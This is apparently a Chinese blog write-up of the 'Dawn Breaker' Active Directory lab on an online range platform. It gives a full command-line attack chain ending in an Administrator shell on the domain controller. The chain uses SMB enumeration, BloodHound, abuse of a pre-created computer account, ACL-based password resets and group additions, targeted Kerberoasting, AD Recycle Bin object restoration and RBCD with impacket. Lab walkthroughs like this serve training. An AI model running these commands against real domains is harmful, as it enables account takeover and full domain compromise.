    <span role="heading" aria-level="2">网络安全在线就能打的内网靶场推荐 &amp; Dawn Breaker 单域靶场 WP</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body cnblogs-markdown">
<p>靶场链接：<br>
无境的目标，是成为网安人必备的靶场，无境一直在持续上架靶场环境，涵盖了网络安全 技术方向的各个分类，在线内网靶场、web靶场、cve复现、SRC场景应有尽有。</p>
<p><a href="https://bdziyi.com/ulab/lab.html?page=target-detail&amp;id=152" target="_blank" rel="noopener nofollow">https://bdziyi.com/ulab/lab.html?page=target-detail&amp;id=152</a></p>
<h1 id="dawn-breaker">Dawn Breaker</h1>
<h2 id="信息收集">信息收集</h2>
<h3 id="smb-welcome-可读">SMB Welcome 可读</h3>
<pre><code class="language-bash">nxc smb 192.168.111.10 -u '' -p ' ' --shares
</code></pre>
<p><img alt="image-20260127155759208" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150540.png" class="lazyload"></p>
<h3 id="读取-lettertxt-文件">读取 Letter.txt 文件</h3>
<p><img alt="image-20260127155929312" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150542.png" class="lazyload"></p>
<p><img alt="image-20260127155946791" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150543.png" class="lazyload"></p>
<p>将这个信息作为用户名和密码进行尝试</p>
<pre><code class="language-bash">nxc smb 192.168.111.10 -u 'Yangyang' -p 'Hello' --shares
</code></pre>
<p><img alt="image-20260127160035430" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150544.png" class="lazyload"></p>
<h3 id="使用-bloodhound-python-进行信息收集">使用 bloodhound-python 进行信息收集</h3>
<pre><code class="language-bash">bloodhound-python -c All -u 'Yangyang' -p 'Hello' -ns 192.168.111.10 -d sec.lab -dc ad.sec.lab --zip --dns-tcp
</code></pre>
<p><img alt="image-20260127160552931" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150545.png" class="lazyload"></p>
<p>但是线路到了 LAHAYO@SEC.LAB 就断开了，接着再分析是否有路线到达域控或者域管理员，看到有一个未知的节点可以RBCD到域控</p>
<p><img alt="image-20260127160819071" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150546.png" class="lazyload"></p>
<h3 id="第二条线路">第二条线路</h3>
<p><img alt="image-20260127161005143" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150547.png" class="lazyload"></p>
<p>经过分析发现 Rover 这个账户很特殊，它关联着一个计算机账户，SOLARIS@SEC.LAB 可以重置它的密码，但是现在还没有 SOLARIS@SEC.LAB 相关的信息</p>
<p><img alt="image-20260127161127087" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150548.png" class="lazyload"></p>
<p><img alt="image-20260127161243989" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150549.png" class="lazyload"></p>
<p>在目前这个情况下想要获取到 SOLARIS@SEC.LAB 有两个方法可以尝试：</p>
<ol>
<li>Pre-Created Computer Account</li>
<li>Timeroasting</li>
</ol>
<h2 id="获取-solarisseclab-的控制权">获取 SOLARIS@SEC.LAB 的控制权</h2>
<p>发现 SOLARIS@SEC.LAB 其实是 <code>Pre-Created Computer Account</code>，利用之前的域账户就能获取到其 Kerberos 凭据，另外 <code>Pre-Created Computer Account</code> 的密码与账户名全小写一样</p>
<p><img alt="image-20260127161805204" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150550.png" class="lazyload"></p>
<p><img alt="image-20260127162125299" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150551.png" class="lazyload"></p>
<h3 id="重置-solarisseclab-自身密码">重置 SOLARIS@SEC.LAB 自身密码</h3>
<pre><code class="language-bash">impacket-changepasswd -altuser 'SOLARIS$' -altpass 'solaris' -newpass '123456' -reset 'sec.lab/SOLARIS$'@ad.sec.lab -k -dc-ip 192.168.111.10
</code></pre>
<p><img alt="image-20260127143528970" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150552.png" class="lazyload"></p>
<h2 id="获取-rover-域用户的控制权">获取 Rover 域用户的控制权</h2>
<h3 id="重置-rover-的密码">重置 Rover 的密码</h3>
<pre><code class="language-bash">bloodyAD -u 'Solaris$' -p '123456' -d sec.lab --host 192.168.111.10 set password Rover 123456
</code></pre>
<p><img alt="image-20260127162301651" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150554.png" class="lazyload"></p>
<p>验证账户不成功，根据报错来判断账户还没启用</p>
<p><img alt="image-20260127162417942" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150555.png" class="lazyload"></p>
<h3 id="启用-rover-账户">启用 Rover 账户</h3>
<pre><code class="language-bash">bloodyAD -u 'Solaris$' -p '123456' -d sec.lab --host 192.168.111.10 remove uac Rover -f ACCOUNTDISABLE
</code></pre>
<p><img alt="image-20260127162448345" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150556.png" class="lazyload"></p>
<h2 id="jinzhou-安全组">Jinzhou 安全组</h2>
<h3 id="addself">AddSelf</h3>
<p>Rover 用户是可以将自身加入 Jinzhou@SEC.LAB</p>
<pre><code class="language-bash">bloodyAD -u Rover -p 123456 --host 192.168.111.10 -d sec.lab add groupMember Jinzhou Rover
</code></pre>
<p><img alt="image-20260127162613183" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150557.png" class="lazyload"></p>
<p><img alt="image-20260127162715025" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150558.png" class="lazyload"></p>
<h3 id="addspn">AddSPN</h3>
<p><img alt="image-20260127162811490" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150559.png" class="lazyload"></p>
<p>根据ACL可以通过给图上四个用户添加 <code>servicePrincipalName</code> 来达到利用 <code>kerberoasting</code> 破解密码</p>
<pre><code class="language-bash">bloodyAD -u 'Rover' -p '123456' -d sec.lab --host 192.168.111.10 set object Jinxi servicePrincipalName -v 'http/web'
</code></pre>
<p><img alt="image-20260127163010676" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150560.png" class="lazyload"></p>
<pre><code class="language-bash">nxc ldap 192.168.111.10 -u 'Rover' -p '123456' --kerberoasting KERBEROASTING
</code></pre>
<p><img alt="image-20260127163036447" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150561.png" class="lazyload"></p>
<pre><code class="language-bash">hashcat KERBEROASTING /usr/share/wordlists/rockyou.txt
</code></pre>
<p><img alt="image-20260127163120546" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150562.png" class="lazyload"></p>
<h2 id="black-shores-安全组">Black Shores 安全组</h2>
<h3 id="addmember">AddMember</h3>
<p><img alt="image-20260127163215281" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150563.png" class="lazyload"></p>
<p>根据 JINXI@SEC.LAB 的ACL，将 Rover 加入 Black ShoresI@SEC.LAB</p>
<pre><code class="language-bash">bloodyAD -u 'Jinxi' -p 'Jinxin' --host ad -d sec.lab add groupMember 'Black Shores' Rover
</code></pre>
<p><img alt="image-20260127163330106" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150564.png" class="lazyload"></p>
<h3 id="writeowner">WriteOwner</h3>
<p><img alt="image-20260127163408351" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150565.png" class="lazyload"></p>
<p>根据ACL，Black ShoresI@SEC.LAB 对 TheShorekeeper 有 WriteOwner 权限</p>
<p><strong>PS：TheShorekeeper 用户是禁用状态，可以使用 nxc 或者 查询 userAccountControl 属性来验证，这里就略过了</strong></p>
<pre><code class="language-bash">bloodyAD -u 'Rover' -p '123456' --host ad -d sec.lab set owner TheShorekeeper Rover

bloodyAD -u 'Rover' -p '123456' --host ad -d sec.lab add genericAll TheShorekeeper Rover

bloodyAD -u 'Rover' -p '123456' --host ad -d sec.lab set password TheShorekeeper 123456

bloodyAD -u 'Rover' -p '123456' -d sec.lab --host 192.168.111.10 remove uac TheShorekeeper -f ACCOUNTDISABLE
</code></pre>
<p><img alt="image-20260127163600093" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150566.png" class="lazyload"></p>
<h2 id="lahayo-安全组">Lahayo 安全组</h2>
<h3 id="addmember-1">AddMember</h3>
<p><img alt="image-20260127163736789" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150567.png" class="lazyload"></p>
<pre><code class="language-bash">bloodyAD -u 'TheShorekeeper' -p '123456' -d sec.lab --host 192.168.111.10 add groupMember Lahayo Rover
</code></pre>
<p><img alt="image-20260127163809083" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150568.png" class="lazyload"></p>
<p>接下来就回到上面信息收集部分分析的路径，到这里就断开了，<strong>注意</strong>：</p>
<ol>
<li>其实这个场景不止两条路径到达最后的域控</li>
<li>下图这个节点到底是什么？它可以 RBCD 到域控</li>
</ol>
<p><img alt="image-20260127164142496" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150569.png" class="lazyload"></p>
<ol start="3">
<li>目前的路径无法获取下面的用户权限</li>
</ol>
<p><img alt="image-20260127164057056" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150570.png" class="lazyload"></p>
<h2 id="active-directory---recycle-bin">Active Directory - Recycle Bin</h2>
<p><strong>Active Directory 回收站</strong> 是 Windows Server 的一项功能，允许在不从备份还原的情况下，完整恢复误删的 AD 对象。</p>
<hr>
<h3 id="核心特性">核心特性</h3>
<ul>
<li><strong>完整恢复</strong>：恢复对象的所有属性（如 SID、组权限、密码）。</li>
<li><strong>生命周期</strong>：
<ol>
<li><strong>已删除状态 (Deleted)</strong>：对象移入回收站，保留所有属性。</li>
<li><strong>已回收状态 (Recycled)</strong>：超过“已删除对象生存期”后，属性被剥离，不可简单恢复。</li>
</ol>
</li>
<li><strong>默认状态</strong>：Windows Server 2008 R2 引入，默认<strong>禁用</strong>，需手动开启且不可逆。</li>
</ul>
<hr>
<h3 id="恢复方式">恢复方式</h3>
<ol>
<li><strong>图形界面</strong>：通过 <code>AD 管理中心 (ADAC)</code> 的 "Deleted Objects" 容器。</li>
<li><strong>命令行</strong>：使用 PowerShell 命令 <code>Restore-ADObject</code>。</li>
</ol>
<h3 id="查询是否有用户对-deleted-objects-有权限">查询是否有用户对 "Deleted Objects" 有权限</h3>
<pre><code class="language-bash">bloodyAD -u Rover -p '123456' -d sec.lab --host 192.168.111.10 get writable
</code></pre>
<p><img alt="image-20260127164507287" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150571.png" class="lazyload"></p>
<p>还发现了一个删除状态的用户</p>
<p><img alt="image-20260127164537834" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150572.png" class="lazyload"></p>
<h3 id="查询已删除用户的信息">查询已删除用户的信息</h3>
<pre><code class="language-bash">bloodyAD -u Rover -p '123456' -d sec.lab --host 192.168.111.10 get search -c '1.2.840.113556.1.4.2064' --filter '(isDeleted=TRUE)' --attr name,objectSid
</code></pre>
<p><img alt="image-20260127164606961" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150573.png" class="lazyload"></p>
<p>Lynae 用户的 objectSid 刚好对于上了未知节点的SID</p>
<p><img alt="image-20260127164142496" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150569.png" class="lazyload"></p>
<h3 id="恢复已删除用户">恢复已删除用户</h3>
<pre><code class="language-bash">bloodyAD -u Rover -p '123456' -d sec.lab --host 192.168.111.10 set restore Lynae
</code></pre>
<p><img alt="image-20260127164640735" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150574.png" class="lazyload"></p>
<h3 id="重置已删除用户的密码和启用用户">重置已删除用户的密码和启用用户</h3>
<pre><code class="language-bash">bloodyAD -u Rover -p '123456' -d sec.lab --host 192.168.111.10 set password Lynae '123456'

bloodyAD -u 'Rover' -p '123456' -d sec.lab --host 192.168.111.10 remove uac Lynae -f ACCOUNTDISABLE
</code></pre>
<p><img alt="image-20260127164731312" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150575.png" class="lazyload"></p>
<h3 id="注意">注意！！！</h3>
<p>如果出现该报错，说明该用户对已删除对象不存在 LIST | READ 权限，WP 中先把 Rover 用户加入了 Lahayo 安全组，bloodhound 中没有实现对该 ACL 的分析，需要自己手动分析</p>
<p><img alt="image-20260127165012339" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150576.png" class="lazyload"></p>
<h3 id="rbcd">RBCD</h3>
<pre><code class="language-bash">bloodyAD -u 'Lynae' -p '123456' -d sec.lab --host 192.168.111.10 add computer Web 123456

bloodyAD -u 'Lynae' -p '123456' -d sec.lab --host 192.168.111.10 add rbcd 'AD$' 'Web$'
</code></pre>
<p><img alt="image-20260127165216752" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150577.png" class="lazyload"></p>
<pre><code class="language-bash">impacket-getST -spn 'CIFS/AD' -impersonate 'Administrator' 'sec.lab/Web$:123456' -k -dc-ip 192.168.111.10

export KRB5CCNAME=Administrator@CIFS_AD@SEC.LAB.ccache

impacket-wmiexec -k -no-pass AD -dc-ip 192.168.111.10 -codec gbk
</code></pre>
<p><img alt="image-20260127165521643" loading="lazy" data-src="https://oss.bdziyi.cn/biji/202605211150228.png" class="lazyload"></p>
